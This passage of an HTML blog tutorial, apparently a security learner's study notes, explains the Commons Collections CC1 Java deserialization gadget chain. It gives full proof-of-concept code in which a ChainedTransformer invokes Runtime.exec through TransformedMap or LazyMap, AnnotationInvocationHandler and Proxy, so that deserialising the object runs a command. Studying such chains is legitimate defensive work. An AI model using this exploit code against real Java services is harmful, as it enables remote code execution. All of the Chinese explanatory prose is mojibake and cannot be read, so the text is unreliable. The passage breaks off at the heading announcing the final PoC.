class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ä¸Šè¾¹ä½¿ç”¨<code>TransformedMap.decorate.put</code>æ²¡æœ‰ä½¿ç”¨<code>AnnotationInvocationHandler</code>ä½œä¸ºåºåˆ—åŒ–è§¦å‘ç‚¹æ—¶ï¼Œåœ¨<code>TransformedMap.decorate</code>ä¿®é¥°è¿‡çš„<code>HashMap</code>å¾—åˆ°çš„<code>outerMap(è½¬åŒ–Map)</code>ä¸­ä¼ å…¥<code>put</code>å‚æ•°å…¶å®ä»»æ„çš†å¯ï¼Œæ­¤å¤„å¦‚æœä¿®æ”¹<code>hm.put(&quot;value&quot;,&quot;value&quot;);</code>ç¬¬ä¸€ä¸ªå‚æ•°<code>&quot;value&quot;</code>ä¸ºå…¶ä»–å€¼åˆ™ä¸èƒ½æ‰§è¡Œï¼šæ²¡æœ‰æŠ¥é”™ï¼Œä¹Ÿç”Ÿæˆäº†åºåˆ—åŒ–æµ(èƒ½è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡)ï¼Œé‚£é—®é¢˜å‡ºåœ¨å“ªï¼Ÿ</p>
<p>p ç‰›ç›´æ¥ç»™å‡ºäº†æ¡ä»¶ï¼š</p>
<p><strong>HashMap.put() ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä¸º value</strong></p>
<p>åœ¨ååºåˆ—åŒ–çš„<code>AnnotationInvocationHandler.readObject</code>ä¸­ï¼Œæ ¹æ®æ¡ä»¶ï¼ŒåŠ¨æ€è°ƒè¯•å¯çŸ¥ï¼Œå½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸º<code>value</code>æ—¶ï¼Œ<code>var7!=null</code>è¿›å…¥åç»­çš„<code>var5.setValue</code></p>
<p>åˆ°è¿™é‡Œè¿˜æ˜¯ä¸æ¸…æ¥šï¼š</p>
<ol>
<li>ä¸ºä»€ä¹ˆè¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>value</code>æ—¶<code>var7</code>ä¸ä¸ºç©ºï¼Ÿ</li>
<li>åå°„è°ƒç”¨<code>AnnotationInvocationHandler</code>æ„é€ æ–¹æ³•æ—¶ï¼Œä¼ å…¥äº†<code>Over.class</code>ï¼Œè¿™ä¸ªå¦‚ä½•å¾—æ¥çš„</li>
<li>è¿™é‡Œçš„<code>setValue</code>æ˜¯å¦‚ä½•è§¦å‘çš„ï¼Ÿï¼ˆå½“ç„¶åœ¨ class åç¼–è¯‘çš„é›å½¢æ¥çœ‹ï¼Œä¸Šè¾¹ poc ä¿®æ”¹ value å³<code>setValue</code>çš„è§¦å‘æ–¹å¼åº”è¯¥æ¥æºäºè¿™é‡Œï¼‰</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//å¿…é¡»è¦å…ˆå­˜å…¥éšæ„çš„é”®å€¼å¯¹ï¼Œä¸‹é¢ä¸¤è¡Œä»£ç ä¿®æ”¹è¿™ä¸ªé”®å€¼å¯¹çš„å€¼è§¦å‘</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>sun åŒ…çš„ä»£ç æ˜¯åç¼–è¯‘åçš„ï¼Œå¯è¯»æ€§è¾ƒå·®ï¼Œåœ¨ openjdk å¯¼å…¥ç›¸å¯¹åº”ç‰ˆæœ¬çš„æºç è¿›è¡Œé˜…è¯»</p>
<p>æ ¹æ® b ç«™å¸ˆå‚…â€”ç™½æ—¥æ¢¦ç»„é•¿ åœ¨ b ç«™çš„è®²è§£ï¼Œä¸‹è½½ 8u_65 ä»¥åŠ<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%9C%A8idea%E9%87%8C%EF%BC%8C%E8%AF%A6%E8%A7%81https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4ï¼Œé…ç½®åœ¨ideaé‡Œï¼Œè¯¦è§https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5</a> ç©ºé™ï¼š8:23</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png" srcset="/img/loading.gif" lazyload></p>
<p><code>AnnotationType</code>æ˜¯ä»€ä¹ˆæ¥çš„ï¼Ÿ</p>
<p>è¿™å°±è¦å¼•å‡º java æ–°çš„çŸ¥è¯†ç‚¹</p>
<p><strong>AnnotationType</strong></p>
<p>æ³¨è§£ã€æ ‡é‡Šï¼Œè¿™æ˜¯å…·æœ‰å’Œæ¥å£ã€ç±»ä¸€æ ·çš„åœ°ä½ä¸€ç§ç±»å‹ï¼Œåœ¨ Java SE 5.0 å¼•å…¥çš„æ¦‚å¿µ</p>
<ul>
<li>æ³¨è§£çš„å®šä¹‰</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> A&#123;&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡ interface å®šä¹‰ï¼Œå¦‚æ­¤å°±åˆ›å»ºäº†ä¸€ä¸ª A çš„æ³¨è§£</p>
<ul>
<li>æ³¨è§£çš„ä½¿ç”¨</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@A</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ç±» A çš„å®šä¹‰å•†æ³•åŠ ä¸Š <code>@A</code> å°±å¯ä»¥ç”¨<code>A</code>æ³¨è§£è¿™ä¸ªç±»</p>
<p>å¯ä»¥ç†è§£ä¸º A è¿™ä¸ªç±»åƒä¸ªæ ‡ç­¾ä¸€æ ·è´´åœ¨ Demo è¿™ä¸ªç±»ä¸Šé¢</p>
<ul>
<li>å…ƒæ³¨è§£</li>
</ul>
<p>è¿˜è¦ä½¿å…¶æ­£å¸¸ä½¿ç”¨çš„è¯ï¼Œè¿˜éœ€è¦å…ƒæ³¨è§£ï¼šå…ƒæ³¨è§£æ˜¯å¯ä»¥æ³¨è§£(V.)åˆ°æ³¨è§£(n.)ä¸Šçš„æ³¨è§£(n.)ï¼Œå³æ˜¯ä¸€ç§åŸºæœ¬æ³¨è§£ï¼Œåªæœ‰äº”ä¸ª</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention</span>  <span class="hljs-comment">//çº¦æŸæ³¨è§£çš„ç”Ÿå‘½å‘¨æœŸï¼Œæœ‰ä¸‰ä¸ªå€¼ï¼šæºç çº§åˆ«(source)ã€ç±»æ–‡ä»¶çº§åˆ«(class)ã€è¿è¡Œæ—¶çº§åˆ«(runtime)</span><br><span class="hljs-meta">@Documented</span> <span class="hljs-comment">//è¢«ä¿®é¥°çš„æ³¨è§£ä¼šç”Ÿæˆåˆ°javadocä¸­</span><br><span class="hljs-meta">@Target</span>     <span class="hljs-comment">//çº¦æŸæ³¨è§£å¯ä»¥åº”ç”¨çš„åœ°æ–¹(å¦‚æ–¹æ³•ã€ç±»æˆ–å­—æ®µ)</span><br><span class="hljs-meta">@Inherited</span>  <span class="hljs-comment">//è®©æ³¨è§£è¢«&quot;ç»§æ‰¿&quot;ï¼šå­ç±»Classå¯¹è±¡å¯ä½¿ç”¨getAnnotations()è·å–çˆ¶ç±»è¢«@Inheritedä¿®é¥°çš„æ³¨è§£</span><br><span class="hljs-meta">@Repeatable</span> <span class="hljs-comment">//æ³¨è§£å¤šå€¼</span><br><br><span class="hljs-comment">//https://www.cnblogs.com/-zhong/p/14961183.html</span><br></code></pre></td></tr></table></figure>

<p>æœ€æ—©æ¥è§¦çš„æ³¨è§£åº”è¯¥æ˜¯ç»§æ‰¿çˆ¶ç±»é‡å†™äº†æ–¹æ³•æ—¶ idea è‡ªåŠ¨ç”Ÿæˆçš„<code>@Override</code></p>
<p>æ¯”å¦‚è¿™ä¸ªä¾‹å­ä¸­é‡å†™äº†<code>Object.equals</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Object</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p1 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        Person p2 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        String a = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        String b = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        System.out.println(a == b);<br>        System.out.println(a.equals(b));<br>        System.out.println(p1.equals(p2));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Person p = (Person) obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age == p.age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>@Override</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-meta">@Target(ElementType.METHOD)</span>  <span class="hljs-comment">//æ³¨è§£åˆ°æ–¹æ³•</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span>  <span class="hljs-comment">//ç”Ÿå‘½å‘¨æœŸä¸ºæºç çº§</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override &#123;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å›åˆ°è¿™ä¸ªé“¾ä¸Š</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png" srcset="/img/loading.gif" lazyload></p>
<p>è¦è§¦å‘<code>setValue</code>å°±è¦<code>memberType != null</code>ï¼Œå°±è¦ä»<code>xxx.class</code>æ‰¾åˆ°å…¶æˆå‘˜æ–¹æ³•ï¼Œè€Œä¼ å…¥çš„ class è¦æ˜¯<code>AnnotationType</code>ç±»å‹çš„ï¼Œè¯´ç™½äº†ç°åœ¨å°±æ˜¯å¡«å…¥ä¸€ä¸ªå…ƒæ³¨è§£ï¼Œä»¥åŠåœ¨ Map ä¼ å…¥ä¸€ä¸ªé”®ä¸ºè¯¥å…ƒæ³¨è§£çš„æˆå‘˜æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retention &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the retention policy.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the retention policy</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">RetentionPolicy <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Target &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to</span><br><span class="hljs-comment">     */</span><br>    ElementType[] value();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å› æ­¤å¡«å…¥<code>Target.class Retention.class</code>å‡å¯ï¼Œä»¥åŠæœ‰ä¸”ä»…æœ‰çš„è¿™ä¸ª<code>value</code>æ–¹æ³•</p>
<p>ç„¶åè·Ÿè¿›å‘ç°<code>setValue</code>è°ƒç”¨<code>AbstractInputCheckedMapDecorator.SetValue</code>ç»§ç»­è°ƒç”¨<code>checkSetValue</code>æ–¹æ³•ï¼Œç„¶åå°±æ˜¯ä¾æ¬¡è°ƒç”¨äº†<code>chainedTransformer</code>çš„<code>transform</code>æ–¹æ³•ï¼ŒRCE</p>
<blockquote>
<p>8u_71 ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler.readObject å¤å†™ç‚¹ï¼Œå› æ­¤ cc1 åªé€‚åˆåœ¨ 8u71 ä¹‹å‰åˆ©ç”¨</p>
</blockquote>
<h4 id="â‘¡LazyMap-Proxy"><a href="#â‘¡LazyMap-Proxy" class="headerlink" title="â‘¡LazyMap+Proxy"></a>â‘¡LazyMap+Proxy</h4><p>åœ¨<code>ysoserial</code>ä¸­ï¼Œå…¶å®å¹¶æ²¡æœ‰ç”¨åˆ°<code>TransformeredMap</code>ï¼Œè€Œæ˜¯ä½¿ç”¨çš„<code>LazyMap</code></p>
<p>åŒºåˆ«åœ¨äºï¼š<code>TransformeredMap</code>åœ¨å†™å…¥å…ƒç´ æ—¶è°ƒç”¨äº†<code>transform</code>ï¼Œè€Œ<code>LazyMap</code>æ˜¯åœ¨<code>get</code>æ—¶æ‰¾ä¸åˆ°å€¼å°±è°ƒç”¨äº†<code>transform</code>æ–¹æ³•(å®ç°äº†æ‡’åŠ è½½)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>            Object value = factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ç›¸æ¯”äº<code>TransformedMap</code>ï¼Œ<code>LazyMap+AnnotationInvocationHandler</code>ç»„åˆåˆ©ç”¨æ–¹å¼æ›´ä¸ºå¤æ‚ï¼Œå› ä¸ºåˆ©ç”¨<code>AnnotationInvocationHandler</code>çš„å¤å†™ç‚¹<code>readObject</code>æ˜¯æ²¡æœ‰ç›´æ¥è°ƒç”¨<code>Map.get</code></p>
<p>ä½†æ˜¯<code>AnnotationInvocationHandler</code>çš„<code>invoke</code>æ–¹æ³•æœ‰<code>get</code>æ–¹æ³•çš„è°ƒç”¨ï¼Œæ³¨æ„åˆ°è¿™ä¸ª<code>AnnotationInvocationHandler</code>å®ç°äº†<code>InvocationHandler</code>æ¥å£ï¼Œé‚£ä¹ˆå¯ä»¥<code>Proxy</code>è¿›è¡ŒåŠ¨æ€ä»£ç†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ç”ŸæˆInvocationHandlerç±»å‹çš„ç±»å®ä¾‹</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œä»£ç†invocationHandlerå®ä¾‹</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶è€Œæ­¤æ—¶è¿˜ä¸èƒ½å‘½ä»¤æ‰§è¡Œ(æ­¤å¤„çœ‹ p ç‰›çš„æ–‡ç« æ²¡çœ‹æ‡‚åç»­å†ç”¨ä¸€æ¬¡<code>AnnotationInvocationHandler</code>åŒ…è£¹ï¼Œæœ‰ç‚¹ç»•)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ç”ŸæˆInvocationHandlerç±»å‹çš„ç±»å®ä¾‹</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œä»£ç†invocationHandlerå®ä¾‹</span><br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶ä¼ å…¥<code>AnnotationInvocationHandler</code>çš„æ„é€ æ–¹æ³•æ˜¯<code>LazyMap</code>çš„ç±»å¯¹è±¡ï¼Œå³<code>AnnotationInvocationHandler(Retention.class,decorate)</code>ï¼Œå†åŠ¨æ€ä»£ç†è¿™ä¸ªå®ç°äº†<code>InvocationHandler</code>çš„<code>AnnotationInvocationHandler</code></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œä½¿ç”¨åŠ¨æ€ä»£ç†å¿…é¡»æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œäºæ˜¯åœ¨ä»£ç†<code>AnnotationInvocationHandler</code>åè¿›è¡Œäº†<code>Map</code>å¼ºè½¬ï¼Œç„¶åå†<code>AnnotationInvocationHandler.readObject</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>memberValues.entrySet-&gt;LazyMap.entrySet-&gt;Map.entrySet-&gt;AnnotationInvocationHandler.invoke</code>å¥½åƒå¤©è¡£æ— ç¼ï¼Œé—®é¢˜æ­£æ˜¯åœ¨è¿™ï¼Œæœ€åæˆ‘ä»¬å¹¶ä¸èƒ½å¦‚æ„¿çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">oos.writeObject(proxymap)<br></code></pre></td></tr></table></figure>

<p><code>Map</code>æ˜¯æ²¡æœ‰å®ç°<code>Serializable</code>çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦<code>AnnotationInvocationHandler</code>å†å¯¹è¿™ä¸ª<code>Map</code>è¿›è¡ŒåŒ…è£¹</p>
<p>æœ€ç»ˆ POCï¼š</p>
